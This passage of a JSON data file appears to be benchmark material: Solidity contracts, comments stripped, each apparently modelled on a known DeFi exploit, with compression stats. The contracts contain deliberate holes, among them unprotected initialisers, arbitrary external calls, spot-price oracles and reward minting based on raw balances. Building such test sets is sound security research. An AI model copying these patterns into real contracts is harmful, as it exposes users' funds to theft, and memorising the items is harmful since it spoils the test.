      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ninterface IPancakeRouter {\nfunction swapExactTokensForTokens(\nuint amountIn,\nuint amountOut,\naddress[] calldata path,\naddress to,\nuint deadline\n) external returns (uint[] memory amounts);\n}\ncontract RewardMinter {\nIERC20 public lpToken;\nIERC20 public rewardToken;\nmapping(address => uint256) public depositedLP;\nmapping(address => uint256) public earnedRewards;\nuint256 public constant REWARD_RATE = 100;\nconstructor(address _lpToken, address _rewardToken) {\nlpToken = IERC20(_lpToken);\nrewardToken = IERC20(_rewardToken);\n}\nfunction deposit(uint256 amount) external {\nlpToken.transferFrom(msg.sender, address(this), amount);\ndepositedLP[msg.sender] += amount;\n}\nfunction mintFor(\naddress flip,\nuint256 _withdrawalFee,\nuint256 _performanceFee,\naddress to,\nuint256\n) external {\nrequire(flip == address(lpToken), \"Invalid token\");\nuint256 feeSum = _performanceFee + _withdrawalFee;\nlpToken.transferFrom(msg.sender, address(this), feeSum);\nuint256 hunnyRewardAmount = tokenToReward(\nlpToken.balanceOf(address(this))\n);\nearnedRewards[to] += hunnyRewardAmount;\n}\nfunction tokenToReward(uint256 lpAmount) internal pure returns (uint256) {\nreturn lpAmount * REWARD_RATE;\n}\nfunction getReward() external {\nuint256 reward = earnedRewards[msg.sender];\nrequire(reward > 0, \"No rewards\");\nearnedRewards[msg.sender] = 0;\nrewardToken.transfer(msg.sender, reward);\n}\nfunction withdraw(uint256 amount) external {\nrequire(depositedLP[msg.sender] >= amount, \"Insufficient balance\");\ndepositedLP[msg.sender] -= amount;\nlpToken.transfer(msg.sender, amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 19,
        "mode": "compressed",
        "original_lines": 87,
        "transformed_lines": 63,
        "original_chars": 2321,
        "transformed_chars": 1817,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_tc_014",
      "transformed_id": "ss_l1_compressed_sn_tc_014",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface ICurve3Pool {\nfunction add_liquidity(\nuint256[3] memory amounts,\nuint256 min_mint_amount\n) external;\nfunction remove_liquidity_imbalance(\nuint256[3] memory amounts,\nuint256 max_burn_amount\n) external;\nfunction get_virtual_price() external view returns (uint256);\n}\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\nfunction approve(address spender, uint256 amount) external returns (bool);\n}\ncontract YieldVault {\nIERC20 public dai;\nIERC20 public crv3;\nICurve3Pool public curve3Pool;\nmapping(address => uint256) public shares;\nuint256 public totalShares;\nuint256 public totalDeposits;\nuint256 public constant MIN_EARN_THRESHOLD = 1000 ether;\nconstructor(address _dai, address _crv3, address _curve3Pool) {\ndai = IERC20(_dai);\ncrv3 = IERC20(_crv3);\ncurve3Pool = ICurve3Pool(_curve3Pool);\n}\nfunction deposit(uint256 amount) external {\ndai.transferFrom(msg.sender, address(this), amount);\nuint256 shareAmount;\nif (totalShares == 0) {\nshareAmount = amount;\n} else {\nshareAmount = (amount * totalShares) / totalDeposits;\n}\nshares[msg.sender] += shareAmount;\ntotalShares += shareAmount;\ntotalDeposits += amount;\n}\nfunction earn() external {\nuint256 vaultBalance = dai.balanceOf(address(this));\nrequire(\nvaultBalance >= MIN_EARN_THRESHOLD,\n\"Insufficient balance to earn\"\n);\nuint256 virtualPrice = curve3Pool.get_virtual_price();\ndai.approve(address(curve3Pool), vaultBalance);\nuint256[3] memory amounts = [vaultBalance, 0, 0];\ncurve3Pool.add_liquidity(amounts, 0);\n}\nfunction withdrawAll() external {\nuint256 userShares = shares[msg.sender];\nrequire(userShares > 0, \"No shares\");\nuint256 withdrawAmount = (userShares * totalDeposits) / totalShares;\nshares[msg.sender] = 0;\ntotalShares -= userShares;\ntotalDeposits -= withdrawAmount;\ndai.transfer(msg.sender, withdrawAmount);\n}\nfunction balance() public view returns (uint256) {\nreturn\ndai.balanceOf(address(this)) +\n(crv3.balanceOf(address(this)) * curve3Pool.get_virtual_price()) /\n1e18;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 24,
        "mode": "compressed",
        "original_lines": 103,
        "transformed_lines": 74,
        "original_chars": 2782,
        "transformed_chars": 2169,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_tc_015",
      "transformed_id": "ss_l1_compressed_sn_tc_015",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract CompoundMarket {\naddress public underlying;\naddress public admin;\nmapping(address => uint256) public accountTokens;\nuint256 public totalSupply;\naddress public constant OLD_TUSD =\n0x8dd5fbCe2F6a956C3022bA3663759011Dd51e73E;\naddress public constant NEW_TUSD =\n0x0000000000085d4780B73119b644AE5ecd22b376;\nconstructor() {\nadmin = msg.sender;\nunderlying = OLD_TUSD;\n}\nfunction mint(uint256 amount) external {\nIERC20(NEW_TUSD).transfer(address(this), amount);\naccountTokens[msg.sender] += amount;\ntotalSupply += amount;\n}\nfunction sweepToken(address token) external {\nrequire(token != underlying, \"Cannot sweep underlying token\");\nuint256 balance = IERC20(token).balanceOf(address(this));\nIERC20(token).transfer(msg.sender, balance);\n}\nfunction redeem(uint256 amount) external {\nrequire(accountTokens[msg.sender] >= amount, \"Insufficient balance\");\naccountTokens[msg.sender] -= amount;\ntotalSupply -= amount;\nIERC20(NEW_TUSD).transfer(msg.sender, amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 54,
        "transformed_lines": 35,
        "original_chars": 1457,
        "transformed_chars": 1147,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_tc_016",
      "transformed_id": "ss_l1_compressed_sn_tc_016",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract LoanToken {\nstring public name = \"iETH\";\nstring public symbol = \"iETH\";\nmapping(address => uint256) public balances;\nuint256 public totalSupply;\nuint256 public totalAssetBorrow;\nuint256 public totalAssetSupply;\nfunction mintWithEther(\naddress receiver\n) external payable returns (uint256 mintAmount) {\nuint256 currentPrice = _tokenPrice();\nmintAmount = (msg.value * 1e18) / currentPrice;\nbalances[receiver] += mintAmount;\ntotalSupply += mintAmount;\ntotalAssetSupply += msg.value;\nreturn mintAmount;\n}\nfunction transfer(address to, uint256 amount) external returns (bool) {\nrequire(balances[msg.sender] >= amount, \"Insufficient balance\");\nbalances[msg.sender] -= amount;\nbalances[to] += amount;\n_notifyTransfer(msg.sender, to, amount);\nreturn true;\n}\nfunction _notifyTransfer(\naddress from,\naddress to,\nuint256 amount\n) internal {\nif (_isContract(to)) {\n(bool success, ) = to.call(\"\");\nsuccess;\n}\n}\nfunction burnToEther(\naddress receiver,\nuint256 amount\n) external returns (uint256 ethAmount) {\nrequire(balances[msg.sender] >= amount, \"Insufficient balance\");\nuint256 currentPrice = _tokenPrice();\nethAmount = (amount * currentPrice) / 1e18;\nbalances[msg.sender] -= amount;\ntotalSupply -= amount;\ntotalAssetSupply -= ethAmount;\npayable(receiver).transfer(ethAmount);\nreturn ethAmount;\n}\nfunction _tokenPrice() internal view returns (uint256) {\nif (totalSupply == 0) {\nreturn 1e18;\n}\nreturn (totalAssetSupply * 1e18) / totalSupply;\n}\nfunction _isContract(address account) internal view returns (bool) {\nuint256 size;\nassembly {\nsize := extcodesize(account)\n}\nreturn size > 0;\n}\nfunction balanceOf(address account) external view returns (uint256) {\nreturn balances[account];\n}\nreceive() external payable {}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 23,
        "mode": "compressed",
        "original_lines": 98,
        "transformed_lines": 70,
        "original_chars": 2490,
        "transformed_chars": 1899,
        "compression_ratio": 0.76
      },
      "error": null
    },
    {
      "original_id": "sn_tc_017",
      "transformed_id": "ss_l1_compressed_sn_tc_017",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ninterface IJar {\nfunction token() external view returns (address);\nfunction withdraw(uint256 amount) external;\n}\ninterface IStrategy {\nfunction withdrawAll() external;\nfunction withdraw(address token) external;\n}\ncontract VaultController {\naddress public governance;\nmapping(address => address) public strategies;\nconstructor() {\ngovernance = msg.sender;\n}\nfunction swapExactJarForJar(\naddress _fromJar,\naddress _toJar,\nuint256 _fromJarAmount,\nuint256 _toJarMinAmount,\naddress[] calldata _targets,\nbytes[] calldata _data\n) external {\nrequire(_targets.length == _data.length, \"Length mismatch\");\nfor (uint256 i = 0; i < _targets.length; i++) {\n(bool success, ) = _targets[i].call(_data[i]);\nrequire(success, \"Call failed\");\n}\n}\nfunction setStrategy(address jar, address strategy) external {\nrequire(msg.sender == governance, \"Not governance\");\nstrategies[jar] = strategy;\n}\n}\ncontract Strategy {\naddress public controller;\naddress public want;\nconstructor(address _controller, address _want) {\ncontroller = _controller;\nwant = _want;\n}\nfunction withdrawAll() external {\nuint256 balance = IERC20(want).balanceOf(address(this));\nIERC20(want).transfer(controller, balance);\n}\nfunction withdraw(address token) external {\nuint256 balance = IERC20(token).balanceOf(address(this));\nIERC20(token).transfer(controller, balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 17,
        "mode": "compressed",
        "original_lines": 76,
        "transformed_lines": 54,
        "original_chars": 1912,
        "transformed_chars": 1507,
        "compression_ratio": 0.79
      },
      "error": null
    },
    {
      "original_id": "sn_tc_018",
      "transformed_id": "ss_l1_compressed_sn_tc_018",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction balanceOf(address account) external view returns (uint256);\nfunction transfer(address to, uint256 amount) external returns (bool);\n}\ncontract TokenPool {\nstruct Token {\naddress addr;\nuint256 balance;\nuint256 weight;\n}\nmapping(address => Token) public tokens;\naddress[] public tokenList;\nuint256 public totalWeight;\nconstructor() {\ntotalWeight = 100;\n}\nfunction addToken(address token, uint256 initialWeight) external {\ntokens[token] = Token({addr: token, balance: 0, weight: initialWeight});\ntokenList.push(token);\n}\nfunction swap(\naddress tokenIn,\naddress tokenOut,\nuint256 amountIn\n) external returns (uint256 amountOut) {\nrequire(tokens[tokenIn].addr != address(0), \"Invalid token\");\nrequire(tokens[tokenOut].addr != address(0), \"Invalid token\");\nIERC20(tokenIn).transfer(address(this), amountIn);\ntokens[tokenIn].balance += amountIn;\namountOut = calculateSwapAmount(tokenIn, tokenOut, amountIn);\nrequire(\ntokens[tokenOut].balance >= amountOut,\n\"Insufficient liquidity\"\n);\ntokens[tokenOut].balance -= amountOut;\nIERC20(tokenOut).transfer(msg.sender, amountOut);\n_updateWeights();\nreturn amountOut;\n}\nfunction calculateSwapAmount(\naddress tokenIn,\naddress tokenOut,\nuint256 amountIn\n) public view returns (uint256) {\nuint256 weightIn = tokens[tokenIn].weight;\nuint256 weightOut = tokens[tokenOut].weight;\nuint256 balanceOut = tokens[tokenOut].balance;\nuint256 numerator = balanceOut * amountIn * weightOut;\nuint256 denominator = tokens[tokenIn].balance *\nweightIn +\namountIn *\nweightOut;\nreturn numerator / denominator;\n}\nfunction _updateWeights() internal {\nuint256 totalValue = 0;\nfor (uint256 i = 0; i < tokenList.length; i++) {\naddress token = tokenList[i];\ntotalValue += tokens[token].balance;\n}\nfor (uint256 i = 0; i < tokenList.length; i++) {\naddress token = tokenList[i];\ntokens[token].weight = (tokens[token].balance * 100) / totalValue;\n}\n}\nfunction getWeight(address token) external view returns (uint256) {\nreturn tokens[token].weight;\n}\nfunction addLiquidity(address token, uint256 amount) external {\nrequire(tokens[token].addr != address(0), \"Invalid token\");\nIERC20(token).transfer(address(this), amount);\ntokens[token].balance += amount;\n_updateWeights();\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 22,
        "mode": "compressed",
        "original_lines": 98,
        "transformed_lines": 76,
        "original_chars": 2794,
        "transformed_chars": 2229,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_tc_019",
      "transformed_id": "ss_l1_compressed_sn_tc_019",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\nfunction balanceOf(address account) external view returns (uint256);\n}\ncontract CrossChainBridge {\naddress public handler;\nevent Deposit(\nuint8 destinationDomainID,\nbytes32 resourceID,\nuint64 depositNonce\n);\nuint64 public depositNonce;\nconstructor(address _handler) {\nhandler = _handler;\n}\nfunction deposit(\nuint8 destinationDomainID,\nbytes32 resourceID,\nbytes calldata data\n) external payable {\ndepositNonce += 1;\nBridgeHandler(handler).deposit(resourceID, msg.sender, data);\nemit Deposit(destinationDomainID, resourceID, depositNonce);\n}\n}\ncontract BridgeHandler {\nmapping(bytes32 => address) public resourceIDToTokenContractAddress;\nmapping(address => bool) public contractWhitelist;\nfunction deposit(\nbytes32 resourceID,\naddress depositer,\nbytes calldata data\n) external {\naddress tokenContract = resourceIDToTokenContractAddress[resourceID];\nuint256 amount;\n(amount) = abi.decode(data, (uint256));\nIERC20(tokenContract).transferFrom(depositer, address(this), amount);\n}\nfunction setResource(bytes32 resourceID, address tokenAddress) external {\nresourceIDToTokenContractAddress[resourceID] = tokenAddress;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 63,
        "transformed_lines": 47,
        "original_chars": 1538,
        "transformed_chars": 1247,
        "compression_ratio": 0.81
      },
      "error": null
    },
    {
      "original_id": "sn_tc_020",
      "transformed_id": "ss_l1_compressed_sn_tc_020",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IUniswapV2Pair {\nfunction getReserves()\nexternal\nview\nreturns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\nfunction totalSupply() external view returns (uint256);\n}\ninterface IERC20 {\nfunction balanceOf(address account) external view returns (uint256);\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\n}\ncontract LendingVault {\nstruct Position {\nuint256 lpTokenAmount;\nuint256 borrowed;\n}\nmapping(address => Position) public positions;\naddress public lpToken;\naddress public stablecoin;\nuint256 public constant COLLATERAL_RATIO = 150;\nconstructor(address _lpToken, address _stablecoin) {\nlpToken = _lpToken;\nstablecoin = _stablecoin;\n}\nfunction deposit(uint256 amount) external {\nIERC20(lpToken).transferFrom(msg.sender, address(this), amount);\npositions[msg.sender].lpTokenAmount += amount;\n}\nfunction borrow(uint256 amount) external {\nuint256 collateralValue = getLPTokenValue(\npositions[msg.sender].lpTokenAmount\n);\nuint256 maxBorrow = (collateralValue * 100) / COLLATERAL_RATIO;\nrequire(\npositions[msg.sender].borrowed + amount <= maxBorrow,\n\"Insufficient collateral\"\n);\npositions[msg.sender].borrowed += amount;\nIERC20(stablecoin).transfer(msg.sender, amount);\n}\nfunction getLPTokenValue(uint256 lpAmount) public view returns (uint256) {\nif (lpAmount == 0) return 0;\nIUniswapV2Pair pair = IUniswapV2Pair(lpToken);\n(uint112 reserve0, uint112 reserve1, ) = pair.getReserves();\nuint256 totalSupply = pair.totalSupply();\nuint256 amount0 = (uint256(reserve0) * lpAmount) / totalSupply;\nuint256 amount1 = (uint256(reserve1) * lpAmount) / totalSupply;\nuint256 value0 = amount0;\nuint256 totalValue = amount0 + amount1;\nreturn totalValue;\n}\nfunction repay(uint256 amount) external {\nrequire(positions[msg.sender].borrowed >= amount, \"Repay exceeds debt\");\nIERC20(stablecoin).transferFrom(msg.sender, address(this), amount);\npositions[msg.sender].borrowed -= amount;\n}\nfunction withdraw(uint256 amount) external {\nrequire(\npositions[msg.sender].lpTokenAmount >= amount,\n\"Insufficient balance\"\n);\nuint256 remainingLP = positions[msg.sender].lpTokenAmount - amount;\nuint256 remainingValue = getLPTokenValue(remainingLP);\nuint256 maxBorrow = (remainingValue * 100) / COLLATERAL_RATIO;\nrequire(\npositions[msg.sender].borrowed <= maxBorrow,\n\"Withdrawal would liquidate position\"\n);\npositions[msg.sender].lpTokenAmount -= amount;\nIERC20(lpToken).transfer(msg.sender, amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 27,
        "mode": "compressed",
        "original_lines": 105,
        "transformed_lines": 78,
        "original_chars": 3093,
        "transformed_chars": 2535,
        "compression_ratio": 0.82
      },
      "error": null
    },
    {
      "original_id": "sn_tc_021",
      "transformed_id": "ss_l1_compressed_sn_tc_021",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction balanceOf(address account) external view returns (uint256);\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\n}\ncontract LiquidityPool {\naddress public maintainer;\naddress public baseToken;\naddress public quoteToken;\nuint256 public lpFeeRate;\nuint256 public baseBalance;\nuint256 public quoteBalance;\nbool public isInitialized;\nevent Initialized(address maintainer, address base, address quote);\nfunction init(\naddress _maintainer,\naddress _baseToken,\naddress _quoteToken,\nuint256 _lpFeeRate\n) external {\nmaintainer = _maintainer;\nbaseToken = _baseToken;\nquoteToken = _quoteToken;\nlpFeeRate = _lpFeeRate;\nisInitialized = true;\nemit Initialized(_maintainer, _baseToken, _quoteToken);\n}\nfunction addLiquidity(uint256 baseAmount, uint256 quoteAmount) external {\nrequire(isInitialized, \"Not initialized\");\nIERC20(baseToken).transferFrom(msg.sender, address(this), baseAmount);\nIERC20(quoteToken).transferFrom(msg.sender, address(this), quoteAmount);\nbaseBalance += baseAmount;\nquoteBalance += quoteAmount;\n}\nfunction swap(\naddress fromToken,\naddress toToken,\nuint256 fromAmount\n) external returns (uint256 toAmount) {\nrequire(isInitialized, \"Not initialized\");\nrequire(\n(fromToken == baseToken && toToken == quoteToken) ||\n(fromToken == quoteToken && toToken == baseToken),\n\"Invalid token pair\"\n);\nIERC20(fromToken).transferFrom(msg.sender, address(this), fromAmount);\nif (fromToken == baseToken) {\ntoAmount = (quoteBalance * fromAmount) / (baseBalance + fromAmount);\nbaseBalance += fromAmount;\nquoteBalance -= toAmount;\n} else {\ntoAmount = (baseBalance * fromAmount) / (quoteBalance + fromAmount);\nquoteBalance += fromAmount;\nbaseBalance -= toAmount;\n}\nuint256 fee = (toAmount * lpFeeRate) / 10000;\ntoAmount -= fee;\nIERC20(toToken).transfer(msg.sender, toAmount);\nIERC20(toToken).transfer(maintainer, fee);\nreturn toAmount;\n}\nfunction claimFees() external {\nrequire(msg.sender == maintainer, \"Only maintainer\");\nuint256 baseTokenBalance = IERC20(baseToken).balanceOf(address(this));\nuint256 quoteTokenBalance = IERC20(quoteToken).balanceOf(address(this));\nif (baseTokenBalance > baseBalance) {\nuint256 excess = baseTokenBalance - baseBalance;\nIERC20(baseToken).transfer(maintainer, excess);\n}\nif (quoteTokenBalance > quoteBalance) {\nuint256 excess = quoteTokenBalance - quoteBalance;\nIERC20(quoteToken).transfer(maintainer, excess);\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 25,
        "mode": "compressed",
        "original_lines": 105,
        "transformed_lines": 80,
        "original_chars": 3122,
        "transformed_chars": 2498,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_tc_022",
      "transformed_id": "ss_l1_compressed_sn_tc_022",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction balanceOf(address account) external view returns (uint256);\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\n}\ncontract TokenPair {\naddress public token0;\naddress public token1;\nuint112 private reserve0;\nuint112 private reserve1;\nuint256 public constant TOTAL_FEE = 16;\nconstructor(address _token0, address _token1) {\ntoken0 = _token0;\ntoken1 = _token1;\n}\nfunction mint(address to) external returns (uint256 liquidity) {\nuint256 balance0 = IERC20(token0).balanceOf(address(this));\nuint256 balance1 = IERC20(token1).balanceOf(address(this));\nuint256 amount0 = balance0 - reserve0;\nuint256 amount1 = balance1 - reserve1;\nliquidity = sqrt(amount0 * amount1);\nreserve0 = uint112(balance0);\nreserve1 = uint112(balance1);\nreturn liquidity;\n}\nfunction swap(\nuint256 amount0Out,\nuint256 amount1Out,\naddress to,\nbytes calldata data\n) external {\nrequire(amount0Out > 0 || amount1Out > 0, \"INSUFFICIENT_OUTPUT_AMOUNT\");\nuint112 _reserve0 = reserve0;\nuint112 _reserve1 = reserve1;\nrequire(\namount0Out < _reserve0 && amount1Out < _reserve1,\n\"INSUFFICIENT_LIQUIDITY\"\n);\nif (amount0Out > 0) IERC20(token0).transfer(to, amount0Out);\nif (amount1Out > 0) IERC20(token1).transfer(to, amount1Out);\nuint256 balance0 = IERC20(token0).balanceOf(address(this));\nuint256 balance1 = IERC20(token1).balanceOf(address(this));\nuint256 amount0In = balance0 > _reserve0 - amount0Out\n? balance0 - (_reserve0 - amount0Out)\n: 0;\nuint256 amount1In = balance1 > _reserve1 - amount1Out\n? balance1 - (_reserve1 - amount1Out)\n: 0;\nrequire(amount0In > 0 || amount1In > 0, \"INSUFFICIENT_INPUT_AMOUNT\");\nuint256 balance0Adjusted = balance0 * 10000 - amount0In * TOTAL_FEE;\nuint256 balance1Adjusted = balance1 * 10000 - amount1In * TOTAL_FEE;\nrequire(\nbalance0Adjusted * balance1Adjusted >=\nuint256(_reserve0) * _reserve1 * (1000 ** 2),\n\"K\"\n);\nreserve0 = uint112(balance0);\nreserve1 = uint112(balance1);\n}\nfunction getReserves() external view returns (uint112, uint112, uint32) {\nreturn (reserve0, reserve1, 0);\n}\nfunction sqrt(uint256 y) internal pure returns (uint256 z) {\nif (y > 3) {\nz = y;\nuint256 x = y / 2 + 1;\nwhile (x < z) {\nz = x;\nx = (y / x + x) / 2;\n}\n} else if (y != 0) {\nz = 1;\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 26,
        "mode": "compressed",
        "original_lines": 106,
        "transformed_lines": 80,
        "original_chars": 2972,
        "transformed_chars": 2319,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_tc_023",
      "transformed_id": "ss_l1_compressed_sn_tc_023",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction balanceOf(address account) external view returns (uint256);\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\n}\ninterface ICErc20 {\nfunction borrow(uint256 amount) external returns (uint256);\nfunction borrowBalanceCurrent(address account) external returns (uint256);\n}\ncontract LeveragedVault {\nstruct Position {\naddress owner;\nuint256 collateral;\nuint256 debtShare;\n}\nmapping(uint256 => Position) public positions;\nuint256 public nextPositionId;\naddress public cToken;\nuint256 public totalDebt;\nuint256 public totalDebtShare;\nconstructor(address _cToken) {\ncToken = _cToken;\nnextPositionId = 1;\n}\nfunction openPosition(\nuint256 collateralAmount,\nuint256 borrowAmount\n) external returns (uint256 positionId) {\npositionId = nextPositionId++;\npositions[positionId] = Position({\nowner: msg.sender,\ncollateral: collateralAmount,\ndebtShare: 0\n});\n_borrow(positionId, borrowAmount);\nreturn positionId;\n}\nfunction _borrow(uint256 positionId, uint256 amount) internal {\nPosition storage pos = positions[positionId];\nuint256 share;\nif (totalDebtShare == 0) {\nshare = amount;\n} else {\nshare = (amount * totalDebtShare) / totalDebt;\n}\npos.debtShare += share;\ntotalDebtShare += share;\ntotalDebt += amount;\nICErc20(cToken).borrow(amount);\n}\nfunction repay(uint256 positionId, uint256 amount) external {\nPosition storage pos = positions[positionId];\nrequire(msg.sender == pos.owner, \"Not position owner\");\nuint256 shareToRemove = (amount * totalDebtShare) / totalDebt;\nrequire(pos.debtShare >= shareToRemove, \"Excessive repayment\");\npos.debtShare -= shareToRemove;\ntotalDebtShare -= shareToRemove;\ntotalDebt -= amount;\n}\nfunction getPositionDebt(\nuint256 positionId\n) external view returns (uint256) {\nPosition storage pos = positions[positionId];\nif (totalDebtShare == 0) return 0;\nreturn (pos.debtShare * totalDebt) / totalDebtShare;\n}\nfunction liquidate(uint256 positionId) external {\nPosition storage pos = positions[positionId];\nuint256 debt = (pos.debtShare * totalDebt) / totalDebtShare;\nrequire(pos.collateral * 100 < debt * 150, \"Position is healthy\");\npos.collateral = 0;\npos.debtShare = 0;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 31,
        "mode": "compressed",
        "original_lines": 110,
        "transformed_lines": 79,
        "original_chars": 2804,
        "transformed_chars": 2254,
        "compression_ratio": 0.8
      },
      "error": null
    },
    {
      "original_id": "sn_tc_024",
      "transformed_id": "ss_l1_compressed_sn_tc_024",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction balanceOf(address account) external view returns (uint256);\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(\naddress from,\naddress to,\nuint256 amount\n) external returns (bool);\n}\ninterface ICurvePool {\nfunction get_virtual_price() external view returns (uint256);\nfunction add_liquidity(\nuint256[3] calldata amounts,\nuint256 minMintAmount\n) external;\n}\ncontract PriceOracle {\nICurvePool public curvePool;\nconstructor(address _curvePool) {\ncurvePool = ICurvePool(_curvePool);\n}\nfunction getPrice() external view returns (uint256) {\nreturn curvePool.get_virtual_price();\n}\n}\ncontract LendingProtocol {\nstruct Position {\nuint256 collateral;\nuint256 borrowed;\n}\nmapping(address => Position) public positions;\naddress public collateralToken;\naddress public borrowToken;\naddress public oracle;\nuint256 public constant COLLATERAL_FACTOR = 80;\nconstructor(\naddress _collateralToken,\naddress _borrowToken,\naddress _oracle\n) {\ncollateralToken = _collateralToken;\nborrowToken = _borrowToken;\noracle = _oracle;\n}\nfunction deposit(uint256 amount) external {\nIERC20(collateralToken).transferFrom(msg.sender, address(this), amount);\npositions[msg.sender].collateral += amount;\n}\nfunction borrow(uint256 amount) external {\nuint256 collateralValue = getCollateralValue(msg.sender);\nuint256 maxBorrow = (collateralValue * COLLATERAL_FACTOR) / 100;\nrequire(\npositions[msg.sender].borrowed + amount <= maxBorrow,\n\"Insufficient collateral\"\n);\npositions[msg.sender].borrowed += amount;\nIERC20(borrowToken).transfer(msg.sender, amount);\n}\nfunction getCollateralValue(address user) public view returns (uint256) {\nuint256 collateralAmount = positions[user].collateral;\nuint256 price = PriceOracle(oracle).getPrice();\nreturn (collateralAmount * price) / 1e18;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 21,
        "mode": "compressed",
        "original_lines": 86,
        "transformed_lines": 65,
        "original_chars": 2231,
        "transformed_chars": 1835,
        "compression_ratio": 0.82
      },
      "error": null
    },
    {
      "original_id": "sn_tc_025",
      "transformed_id": "ss_l1_compressed_sn_tc_025",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.8.0;\ninterface IERC20 {\nfunction transfer(address to, uint256 amount) external returns (bool);\nfunction transferFrom(address from, address to, uint256 amount) external returns (bool);\n}\ninterface ICompoundToken {\nfunction borrow(uint256 amount) external;\nfunction repayBorrow(uint256 amount) external;\nfunction redeem(uint256 tokens) external;\nfunction mint(uint256 amount) external;\n}\ncontract LendingMarket {\nmapping(address => uint256) public accountBorrows;\nmapping(address => uint256) public accountTokens;\naddress public underlying;\nuint256 public totalBorrows;\nconstructor(address _underlying) {\nunderlying = _underlying;\n}\nfunction borrow(uint256 amount) external {\naccountBorrows[msg.sender] += amount;\ntotalBorrows += amount;\nIERC20(underlying).transfer(msg.sender, amount);\n}\nfunction repayBorrow(uint256 amount) external {\nIERC20(underlying).transferFrom(msg.sender, address(this), amount);\naccountBorrows[msg.sender] -= amount;\ntotalBorrows -= amount;\n}\n}",
      "rename_map": {},
